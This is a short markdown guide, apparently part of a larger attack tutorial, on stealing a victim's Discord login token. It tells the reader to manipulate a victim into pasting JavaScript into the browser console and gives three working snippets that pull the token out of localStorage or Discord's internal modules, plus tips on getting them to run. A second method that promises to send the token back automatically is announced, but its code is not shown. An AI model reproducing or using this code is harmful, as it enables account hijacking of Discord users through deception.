## Discord Matters

### Grabbing the token
Our first step is to obtain the discord token. This can be done through a C++ program compiled into exe, Python program (may be in exe), or JavaScript injection in the console of discord web version. This involves a little social engineering as it requires either you or the victim to run the code and grab the token.

- Method 1: 

Get user to copy and paste this code into browser and send you back the token. Token will be alerted in window and logged in console. 

``` function getLocalStoragePropertyDescriptor() {const iframe = document.createElement('iframe');document.head.append(iframe);const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');iframe.remove();return pd;} Object.defineProperty(window, 'localStorage', getLocalStoragePropertyDescriptor());console.log(localStorage.token); window.alert(localStorage.token); ```

Make sure to tell the user to ```toggle device toolbar``` with the button below or else the code will not fetch.

Before: ![](https://i.imgur.com/AfWZAQl.jpeg)
After: ![](https://i.imgur.com/zl2sHCk.jpeg)

Alternative codes, follow the same steps as above.

```javascript:document.getElementsByTagName("body")[0].innerHTML = localStorage.token;```

```Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()```

- Method 2:

Get user to copy and paste this code into browser and token will be automatically sent back to you.
